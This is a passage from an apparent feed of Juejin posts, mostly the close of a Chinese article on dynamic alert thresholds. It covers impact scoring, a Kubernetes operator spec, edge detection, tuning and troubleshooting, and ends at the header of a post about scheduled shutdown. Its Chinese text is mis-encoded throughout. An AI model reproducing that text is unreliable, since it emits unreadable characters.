        
        <span class="hljs-comment"># è®¡ç®—å½±å“èŒƒå›´</span>
        affected_services = self._calculate_blast_radius(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å½±å“å…³é”®è·¯å¾„</span>
        is_critical_path = self._is_on_critical_path(
            service, 
            dependency_graph
        )
        
        <span class="hljs-comment"># è®¡ç®—åˆ†æ•°</span>
        score = <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> <span class="hljs-keyword">if</span> is_critical_path <span class="hljs-keyword">else</span> <span class="hljs-number">0.0</span>
        score += <span class="hljs-number">0.5</span> * (<span class="hljs-built_in">len</span>(affected_services) / <span class="hljs-built_in">len</span>(dependency_graph))
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(score, <span class="hljs-number">1.0</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_blast_radius</span>(<span class="hljs-params">self, service, graph</span>):
        <span class="hljs-string">"""è®¡ç®—çˆ†ç‚¸åŠå¾„ï¼ˆå½±å“èŒƒå›´ï¼‰"""</span>
        affected = <span class="hljs-built_in">set</span>()
        queue = [service]
        
        <span class="hljs-keyword">while</span> queue:
            current = queue.pop(<span class="hljs-number">0</span>)
            <span class="hljs-keyword">if</span> current <span class="hljs-keyword">in</span> affected:
                <span class="hljs-keyword">continue</span>
            
            affected.add(current)
            
            <span class="hljs-comment"># æ·»åŠ æ‰€æœ‰ä¾èµ–å½“å‰æœåŠ¡çš„æœåŠ¡</span>
            <span class="hljs-keyword">for</span> dependent <span class="hljs-keyword">in</span> graph.get_dependents(current):
                queue.append(dependent)
        
        <span class="hljs-keyword">return</span> affected

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessDimension</span>:
    <span class="hljs-string">"""ä¸šåŠ¡ç»´åº¦è¯„ä¼°"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">self, event</span>):
        <span class="hljs-string">"""è¯„ä¼°å¯¹ä¸šåŠ¡çš„å½±å“"""</span>
        service = event[<span class="hljs-string">'service'</span>]
        
        <span class="hljs-comment"># è·å–æœåŠ¡çš„ä¸šåŠ¡é‡è¦æ€§</span>
        business_criticality = self._get_business_criticality(service)
        
        <span class="hljs-comment"># è·å–å½“å‰ä¸šåŠ¡é‡</span>
        current_traffic = self._get_current_traffic(service)
        normal_traffic = self._get_normal_traffic(service)
        
        <span class="hljs-comment"># æµé‡å æ¯”</span>
        traffic_ratio = current_traffic / (normal_traffic + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-comment"># ç»¼åˆè¯„åˆ†</span>
        score = business_criticality * <span class="hljs-built_in">min</span>(traffic_ratio, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-keyword">return</span> score
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_business_criticality</span>(<span class="hljs-params">self, service</span>):
        <span class="hljs-string">"""è·å–ä¸šåŠ¡å…³é”®åº¦"""</span>
        criticality_map = {
            <span class="hljs-string">'payment'</span>: <span class="hljs-number">1.0</span>,      <span class="hljs-comment"># æ”¯ä»˜æœåŠ¡ï¼šæœ€é«˜ä¼˜å…ˆçº§</span>
            <span class="hljs-string">'order'</span>: <span class="hljs-number">0.9</span>,        <span class="hljs-comment"># è®¢å•æœåŠ¡</span>
            <span class="hljs-string">'user'</span>: <span class="hljs-number">0.8</span>,         <span class="hljs-comment"># ç”¨æˆ·æœåŠ¡</span>
            <span class="hljs-string">'search'</span>: <span class="hljs-number">0.7</span>,       <span class="hljs-comment"># æœç´¢æœåŠ¡</span>
            <span class="hljs-string">'recommendation'</span>: <span class="hljs-number">0.5</span> <span class="hljs-comment"># æ¨èæœåŠ¡</span>
        }
        <span class="hljs-keyword">return</span> criticality_map.get(service, <span class="hljs-number">0.3</span>)
</code></pre>
<h3 data-id="heading-38">8.4 äº‘åŸç”Ÿä¸å®¹å™¨åŒ–éƒ¨ç½²</h3>
<p><strong>Kubernetes Operatoræ¨¡å¼</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># dynamic-threshold-operator.yaml</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">monitoring.company.com/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">DynamicThreshold</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">cpu-threshold</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">production</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">metric:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">cpu_usage</span>
    <span class="hljs-attr">source:</span> <span class="hljs-string">prometheus</span>
    <span class="hljs-attr">query:</span> <span class="hljs-string">'rate(container_cpu_usage_seconds_total[5m])'</span>
  
  <span class="hljs-attr">algorithm:</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">stl</span>
    <span class="hljs-attr">windowSize:</span> <span class="hljs-string">168h</span>
    <span class="hljs-attr">seasonalPeriod:</span> <span class="hljs-string">24h</span>
    <span class="hljs-attr">sigmaMultiplier:</span> <span class="hljs-number">3.0</span>
  
  <span class="hljs-attr">alerting:</span>
    <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
    <span class="hljs-attr">channels:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dingtalk</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">email</span>
    <span class="hljs-attr">suppression:</span>
      <span class="hljs-attr">cooldownPeriod:</span> <span class="hljs-string">5m</span>
  
  <span class="hljs-attr">autoRemediation:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">actions:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">scale</span>
        <span class="hljs-attr">direction:</span> <span class="hljs-string">up</span>
        <span class="hljs-attr">maxReplicas:</span> <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-39">8.5 è¾¹ç¼˜è®¡ç®—åœºæ™¯</h3>
<p><strong>æŒ‘æˆ˜</strong>ï¼š</p>
<ul>
<li>ç½‘ç»œä¸ç¨³å®šï¼Œæ— æ³•å®æ—¶ä¼ è¾“æ•°æ®</li>
<li>è®¡ç®—èµ„æºå—é™</li>
<li>éœ€è¦æœ¬åœ°å¿«é€Ÿå†³ç­–</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè½»é‡çº§è¾¹ç¼˜é˜ˆå€¼å¼•æ“</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeThresholdEngine</span>:
    <span class="hljs-string">"""è¾¹ç¼˜è®¡ç®—åœºæ™¯çš„è½»é‡çº§é˜ˆå€¼å¼•æ“"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_memory_mb=<span class="hljs-number">50</span></span>):
        self.max_memory_mb = max_memory_mb
        self.history = deque(maxlen=<span class="hljs-number">168</span>)  <span class="hljs-comment"># ä»…ä¿ç•™7å¤©æ•°æ®</span>
        self.compressed_model = <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_model</span>(<span class="hljs-params">self, full_model</span>):
        <span class="hljs-string">"""å‹ç¼©æ¨¡å‹ä»¥é€‚åº”è¾¹ç¼˜è®¾å¤‡"""</span>
        <span class="hljs-comment"># 1. é‡åŒ–ï¼šfloat64 â†’ float16</span>
        compressed = {
            <span class="hljs-string">'trend'</span>: full_model[<span class="hljs-string">'trend'</span>].astype(np.float16),
            <span class="hljs-string">'seasonal'</span>: full_model[<span class="hljs-string">'seasonal'</span>].astype(np.float16),
            <span class="hljs-string">'residual_std'</span>: np.float16(full_model[<span class="hljs-string">'residual_std'</span>])
        }
        
        <span class="hljs-comment"># 2. é™é‡‡æ ·ï¼šä¿ç•™å…³é”®ç‚¹</span>
        compressed[<span class="hljs-string">'trend'</span>] = self._downsample(compressed[<span class="hljs-string">'trend'</span>], factor=<span class="hljs-number">2</span>)
        compressed[<span class="hljs-string">'seasonal'</span>] = self._downsample(compressed[<span class="hljs-string">'seasonal'</span>], factor=<span class="hljs-number">2</span>)
        
        self.compressed_model = compressed
        <span class="hljs-keyword">return</span> compressed
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lightweight_detection</span>(<span class="hljs-params">self, value, timestamp</span>):
        <span class="hljs-string">"""è½»é‡çº§å¼‚å¸¸æ£€æµ‹"""</span>
        <span class="hljs-keyword">if</span> self.compressed_model <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">'reason'</span>: <span class="hljs-string">'model_not_ready'</span>}
        
        <span class="hljs-comment"># ä½¿ç”¨ç®€åŒ–çš„åˆ¤æ–­é€»è¾‘</span>
        hour_of_day = timestamp.hour
        expected = (
            self.compressed_model[<span class="hljs-string">'trend'</span>][-<span class="hljs-number">1</span>] + 
            self.compressed_model[<span class="hljs-string">'seasonal'</span>][hour_of_day % <span class="hljs-number">24</span>]
        )
        
        threshold = <span class="hljs-number">3</span> * self.compressed_model[<span class="hljs-string">'residual_std'</span>]
        
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(value - expected) &gt; threshold:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'expected'</span>: <span class="hljs-built_in">float</span>(expected),
                <span class="hljs-string">'threshold'</span>: <span class="hljs-built_in">float</span>(threshold),
                <span class="hljs-string">'deviation'</span>: <span class="hljs-built_in">float</span>(value - expected)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_with_cloud</span>(<span class="hljs-params">self, cloud_endpoint</span>):
        <span class="hljs-string">"""ä¸äº‘ç«¯åŒæ­¥æ¨¡å‹"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä¸Šä¼ æœ¬åœ°æ•°æ®</span>
            self._upload_data(cloud_endpoint)
            
            <span class="hljs-comment"># ä¸‹è½½æ›´æ–°çš„æ¨¡å‹</span>
            updated_model = self._download_model(cloud_endpoint)
            self.compressed_model = self.compress_model(updated_model)
            
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'synced'</span>}
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># ç½‘ç»œæ•…éšœæ—¶ç»§ç»­ä½¿ç”¨æœ¬åœ°æ¨¡å‹</span>
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'status'</span>: <span class="hljs-string">'offline'</span>, <span class="hljs-string">'error'</span>: <span class="hljs-built_in">str</span>(e)}
</code></pre>
<h2 data-id="heading-40">ä¹ã€æœ€ä½³å®è·µæ€»ç»“</h2>
<h3 data-id="heading-41">9.1 å®æ–½è·¯çº¿å›¾</h3>
<p><strong>é˜¶æ®µä¸€ï¼šè¯•ç‚¹éªŒè¯ï¼ˆ1-2å‘¨ï¼‰</strong></p>
<ol>
<li>é€‰æ‹©1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¿›è¡Œè¯•ç‚¹</li>
<li>ä¸ç°æœ‰å›ºå®šé˜ˆå€¼å¹¶è¡Œè¿è¡Œ</li>
<li>æ”¶é›†æ•°æ®ï¼Œå¯¹æ¯”æ•ˆæœ</li>
</ol>
<p><strong>é˜¶æ®µäºŒï¼šå°èŒƒå›´æ¨å¹¿ï¼ˆ1ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>æ‰©å±•åˆ°10-20ä¸ªæœåŠ¡</li>
<li>å»ºç«‹è¿ç»´åé¦ˆæœºåˆ¶</li>
<li>ä¼˜åŒ–å‚æ•°é…ç½®</li>
</ol>
<p><strong>é˜¶æ®µä¸‰ï¼šå…¨é¢éƒ¨ç½²ï¼ˆ2-3ä¸ªæœˆï¼‰</strong></p>
<ol>
<li>è¦†ç›–æ‰€æœ‰å…³é”®æœåŠ¡</li>
<li>é›†æˆåˆ°ç°æœ‰ç›‘æ§å¹³å°</li>
<li>åŸ¹è®­è¿ç»´å›¢é˜Ÿ</li>
</ol>
<p><strong>é˜¶æ®µå››ï¼šæŒç»­ä¼˜åŒ–ï¼ˆé•¿æœŸï¼‰</strong></p>
<ol>
<li>å¯ç”¨è‡ªé€‚åº”å­¦ä¹ </li>
<li>é›†æˆAIOpsèƒ½åŠ›</li>
<li>æ‰©å±•åˆ°æ›´å¤šåœºæ™¯</li>
</ol>
<h3 data-id="heading-42">9.2 é…ç½®è°ƒä¼˜æŒ‡å—</h3>
<p><strong>çª—å£å¤§å°é€‰æ‹©</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_window_size</span>(<span class="hljs-params">metric_type, data_pattern</span>):
    <span class="hljs-string">"""æ¨èçª—å£å¤§å°"""</span>
    <span class="hljs-keyword">if</span> data_pattern == <span class="hljs-string">'high_volatility'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é«˜æ³¢åŠ¨ï¼šçŸ­çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'stable'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># ç¨³å®šï¼šæ ‡å‡†çª—å£</span>
    <span class="hljs-keyword">elif</span> data_pattern == <span class="hljs-string">'long_term_trend'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">720</span>  <span class="hljs-comment"># é•¿æœŸè¶‹åŠ¿ï¼šé•¿çª—å£</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">168</span>  <span class="hljs-comment"># é»˜è®¤</span>
</code></pre>
<p><strong>Sigmaå€æ•°è°ƒæ•´</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recommend_sigma_multiplier</span>(<span class="hljs-params">false_positive_rate</span>):
    <span class="hljs-string">"""æ ¹æ®è¯¯æŠ¥ç‡æ¨èsigmaå€æ•°"""</span>
    <span class="hljs-keyword">if</span> false_positive_rate &gt; <span class="hljs-number">0.5</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">4.0</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šæ”¾å®½é˜ˆå€¼</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.3</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.5</span>
    <span class="hljs-keyword">elif</span> false_positive_rate &gt; <span class="hljs-number">0.1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">3.0</span>  <span class="hljs-comment"># æ ‡å‡†</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">2.5</span>  <span class="hljs-comment"># è¯¯æŠ¥ç‡ä½ï¼šå¯ä»¥æ”¶ç´§</span>
</code></pre>
<h3 data-id="heading-43">9.3 ç›‘æ§æŒ‡æ ‡ä½“ç³»</h3>
<p><strong>ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemHealthMetrics</span>:
    <span class="hljs-string">"""ç³»ç»Ÿå¥åº·åº¦æŒ‡æ ‡"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_metrics</span>(<span class="hljs-params">alerting_system</span>):
        <span class="hljs-string">"""è®¡ç®—å…³é”®æŒ‡æ ‡"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment"># å‘Šè­¦è´¨é‡æŒ‡æ ‡</span>
            <span class="hljs-string">'precision'</span>: alerting_system.get_precision(),
            <span class="hljs-string">'recall'</span>: alerting_system.get_recall(),
            <span class="hljs-string">'f1_score'</span>: alerting_system.get_f1_score(),
            
            <span class="hljs-comment"># æ•ˆç‡æŒ‡æ ‡</span>
            <span class="hljs-string">'alert_volume_reduction'</span>: alerting_system.get_volume_reduction(),
            <span class="hljs-string">'mttr'</span>: alerting_system.get_mean_time_to_resolve(),
            <span class="hljs-string">'mttd'</span>: alerting_system.get_mean_time_to_detect(),
            
            <span class="hljs-comment"># ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡</span>
            <span class="hljs-string">'avg_processing_time'</span>: alerting_system.get_avg_processing_time(),
            <span class="hljs-string">'model_confidence'</span>: alerting_system.get_avg_confidence(),
            <span class="hljs-string">'data_coverage'</span>: alerting_system.get_data_coverage(),
            
            <span class="hljs-comment"># ä¸šåŠ¡å½±å“æŒ‡æ ‡</span>
            <span class="hljs-string">'prevented_incidents'</span>: alerting_system.get_prevented_incidents(),
            <span class="hljs-string">'cost_savings'</span>: alerting_system.calculate_cost_savings()
        }
</code></pre>
<h3 data-id="heading-44">9.4 æ•…éšœæ’æŸ¥æ¸…å•</h3>
<p><strong>é—®é¢˜ï¼šé˜ˆå€¼è®¡ç®—å¤±è´¥</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥æ•°æ®å®Œæ•´æ€§ï¼ˆæ˜¯å¦æœ‰å¤§é‡ç¼ºå¤±å€¼ï¼‰
â–¡ æ£€æŸ¥æ•°æ®èŒƒå›´ï¼ˆæ˜¯å¦æœ‰å¼‚å¸¸çš„æå€¼ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦æœ‰è¶³å¤Ÿçš„å†å²æ•°æ®ï¼‰
â–¡ æ£€æŸ¥å­£èŠ‚å‘¨æœŸè®¾ç½®ï¼ˆæ˜¯å¦ä¸å®é™…ä¸šåŠ¡åŒ¹é…ï¼‰
â–¡ æŸ¥çœ‹æ—¥å¿—ä¸­çš„é”™è¯¯ä¿¡æ¯
</code></pre>
<p><strong>é—®é¢˜ï¼šå‘Šè­¦è¿‡å¤š</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å°ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰æŒç»­çš„å¼‚å¸¸çŠ¶æ€ï¼ˆç³»ç»Ÿæ˜¯å¦çœŸçš„æœ‰é—®é¢˜ï¼‰
â–¡ æ£€æŸ¥å‘Šè­¦æŠ‘åˆ¶é…ç½®ï¼ˆå†·å´æœŸæ˜¯å¦è¿‡çŸ­ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦æœ‰çªå‘äº‹ä»¶ï¼ˆæ˜¯å¦éœ€è¦æ³¨å†Œäº‹ä»¶ï¼‰
â–¡ å¯ç”¨è‡ªé€‚åº”å­¦ä¹ ï¼ˆè®©ç³»ç»Ÿè‡ªåŠ¨è°ƒæ•´ï¼‰
</code></pre>
<p><strong>é—®é¢˜ï¼šæ¼æŠ¥å…³é”®æ•…éšœ</strong></p>
<pre><code class="hljs">â–¡ æ£€æŸ¥sigmaå€æ•°ï¼ˆæ˜¯å¦è®¾ç½®è¿‡å¤§ï¼‰
â–¡ æ£€æŸ¥çª—å£å¤§å°ï¼ˆæ˜¯å¦è¿‡é•¿å¯¼è‡´å“åº”æ…¢ï¼‰
â–¡ æ£€æŸ¥æ˜¯å¦å¯ç”¨å¤šç»´åº¦æ£€æµ‹ï¼ˆå•ä¸€æŒ‡æ ‡å¯èƒ½ä¸å¤Ÿï¼‰
â–¡ æ£€æŸ¥ä¸šåŠ¡å…³é”®åº¦é…ç½®ï¼ˆæ˜¯å¦æ­£ç¡®æ ‡è®°å…³é”®æœåŠ¡ï¼‰
â–¡ è€ƒè™‘æ·»åŠ åŸºäºè§„åˆ™çš„å…œåº•å‘Šè­¦
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿé€šè¿‡<strong>è‡ªæˆ‘å­¦ä¹ </strong>å’Œ<strong>è‡ªé€‚åº”è°ƒæ•´</strong>ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†ä¼ ç»Ÿå›ºå®šé˜ˆå€¼çš„ä¸‰å¤§ç—›ç‚¹ï¼š</p>
<ol>
<li><strong>å‘Šè­¦ç–²åŠ³</strong>Â â†’ å‘Šè­¦é‡å‡å°‘60-80%</li>
<li><strong>è¯¯æŠ¥ç‡é«˜</strong>Â â†’ æœ‰æ•ˆå‘Šè­¦æ¯”ä¾‹æå‡è‡³70%+</li>
<li><strong>æ— æ³•é€‚åº”å˜åŒ–</strong>Â â†’ è‡ªåŠ¨é€‚åº”ä¸šåŠ¡å¢é•¿å’Œå‘¨æœŸå˜åŒ–</li>
</ol>
<h3 data-id="heading-45">10.2 å…³é”®æŠ€æœ¯è¦ç‚¹</h3>
<ul>
<li><strong>STLæ—¶é—´åºåˆ—åˆ†è§£</strong>ï¼šå°†å¤æ‚çš„æ—¶é—´åºåˆ—æ‹†è§£ä¸ºè¶‹åŠ¿ã€å­£èŠ‚ã€æ®‹å·®</li>
<li><strong>3ÏƒåŸåˆ™</strong>ï¼šåŸºäºç»Ÿè®¡å­¦çš„å¼‚å¸¸åˆ¤æ–­æ ‡å‡†</li>
<li><strong>æ»‘åŠ¨çª—å£</strong>ï¼šæŒç»­å­¦ä¹ æœ€æ–°çš„ä¸šåŠ¡æ¨¡å¼</li>
<li><strong>å¤šç»´åº¦æ£€æµ‹</strong>ï¼šç»“åˆæŒ‡æ ‡ã€æ‹“æ‰‘ã€ä¸šåŠ¡ã€æ—¶é—´ç­‰å¤šä¸ªç»´åº¦</li>
<li><strong>è‡ªé€‚åº”å­¦ä¹ </strong>ï¼šä»åé¦ˆä¸­æŒç»­ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-46">10.3 å®æ–½å»ºè®®</h3>
<ol>
<li><strong>ä»å°åšèµ·</strong>ï¼šå…ˆåœ¨1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¯•ç‚¹</li>
<li><strong>å¹¶è¡Œè¿è¡Œ</strong>ï¼šä¸ç°æœ‰ç³»ç»Ÿå¹¶è¡Œï¼Œé€æ­¥åˆ‡æ¢</li>
<li><strong>æŒç»­ä¼˜åŒ–</strong>ï¼šæ ¹æ®åé¦ˆä¸æ–­è°ƒæ•´å‚æ•°</li>
<li><strong>å›¢é˜ŸåŸ¹è®­</strong>ï¼šç¡®ä¿è¿ç»´å›¢é˜Ÿç†è§£æ–°ç³»ç»Ÿ</li>
<li><strong>æ–‡æ¡£å®Œå–„</strong>ï¼šè®°å½•é…ç½®ã€æ¡ˆä¾‹ã€ç»éªŒ</li>
</ol>
<h3 data-id="heading-47">10.4 æœªæ¥è¶‹åŠ¿</h3>
<p><strong>æ™ºèƒ½åŒ–</strong>ï¼šä»è§„åˆ™é©±åŠ¨åˆ°AIé©±åŠ¨</p>
<ul>
<li>æ·±åº¦å­¦ä¹ æ¨¡å‹æ›¿ä»£ä¼ ç»Ÿç»Ÿè®¡æ–¹æ³•</li>
<li>è‡ªåŠ¨æ ¹å› åˆ†æå’Œæ•…éšœé¢„æµ‹</li>
<li>æ™ºèƒ½æ¨èä¿®å¤æ–¹æ¡ˆ</li>
</ul>
<p><strong>è‡ªåŠ¨åŒ–</strong>ï¼šä»å‘Šè­¦åˆ°è‡ªæ„ˆ</p>
<ul>
<li>è‡ªåŠ¨æ‰§è¡Œä¿®å¤åŠ¨ä½œ</li>
<li>é—­ç¯åé¦ˆä¼˜åŒ–</li>
<li>é›¶äººå·¥å¹²é¢„çš„è¿ç»´</li>
</ul>
<p><strong>å…¨å±€åŒ–</strong>ï¼šä»å•ç‚¹åˆ°å…¨å±€</p>
<ul>
<li>å…¨é“¾è·¯è¿½è¸ªä¸åˆ†æ</li>
<li>è·¨ç³»ç»Ÿå…³è”åˆ†æ</li>
<li>ä¸šåŠ¡è§†è§’çš„ç»Ÿä¸€ç›‘æ§</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">å®Œæ•´ä»£ç ä»“åº“å¦‚ä¸‹ï¼š
<span class="hljs-built_in">dynamic</span>-threshold-system/
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ threshold_generator.py      <span class="hljs-meta"># æ ¸å¿ƒé˜ˆå€¼ç”Ÿæˆå™¨</span>
â”‚   â”œâ”€â”€ stl_decomposer.py          <span class="hljs-meta"># STLåˆ†è§£å™¨</span>
â”‚   â””â”€â”€ anomaly_detector.py        <span class="hljs-meta"># å¼‚å¸¸æ£€æµ‹å™¨</span>
â”œâ”€â”€ integrations/
â”‚   â”œâ”€â”€ prometheus.py              <span class="hljs-meta"># Prometheusé›†æˆ</span>
â”‚   â”œâ”€â”€ influxdb.py                <span class="hljs-meta"># InfluxDBé›†æˆ</span>
â”‚   â””â”€â”€ grafana.py                 <span class="hljs-meta"># Grafanaé›†æˆ</span>
â”œâ”€â”€ notifiers/
â”‚   â”œâ”€â”€ dingtalk.py                <span class="hljs-meta"># é’‰é’‰é€šçŸ¥</span>
â”‚   â”œâ”€â”€ email.py                   <span class="hljs-meta"># é‚®ä»¶é€šçŸ¥</span>
â”‚   â””â”€â”€ pagerduty.py               <span class="hljs-meta"># PagerDutyé€šçŸ¥</span>
â”œâ”€â”€ operators/
â”‚   â””â”€â”€ kubernetes_operator.py     <span class="hljs-meta"># K8s Operator</span>
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ test_threshold_generator.py
â”‚   â””â”€â”€ test_anomaly_detector.py
â”œâ”€â”€ examples/
â”‚   â”œâ”€â”€ basic_usage.py
â”‚   â””â”€â”€ advanced_usage.py
â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ architecture.md
â”‚   â”œâ”€â”€ api_reference.md
â”‚   â””â”€â”€ deployment_guide.md
â”œâ”€â”€ requirements.txt
â””â”€â”€ README.md
</code></pre>
<h3 data-id="heading-48">å‚è€ƒèµ„æº</h3>
<p><strong>å­¦æœ¯è®ºæ–‡</strong>ï¼š</p>
<ul>
<li>Cleveland et al. (1990): â€œSTL: A Seasonal-Trend Decomposition Procedure Based on Loessâ€</li>
<li>Laptev et al. (2015): â€œTime-Series Extreme Event Forecasting with Neural Networks at Uberâ€</li>
</ul>
<p><strong>å¼€æºé¡¹ç›®</strong>ï¼š</p>
<ul>
<li>Facebook Prophet: æ—¶é—´åºåˆ—é¢„æµ‹</li>
<li>Twitter AnomalyDetection: å¼‚å¸¸æ£€æµ‹</li>
<li>LinkedIn Luminol: å¼‚å¸¸æ£€æµ‹å’Œå…³è”åˆ†æ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )]]></title>    <link>https://juejin.cn/post/7592552501579284506</link>    <guid>https://juejin.cn/post/7592552501579284506</guid>    <pubDate>2026-01-08T02:27:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579284506" data-draft-id="7592759902675664942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:27:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PieroPC"/> <meta itemprop="url" content="https://juejin.cn/user/1998231182522521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1998231182522521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PieroPC
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:27:08.000Z" title="Thu Jan 08 2026 02:27:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
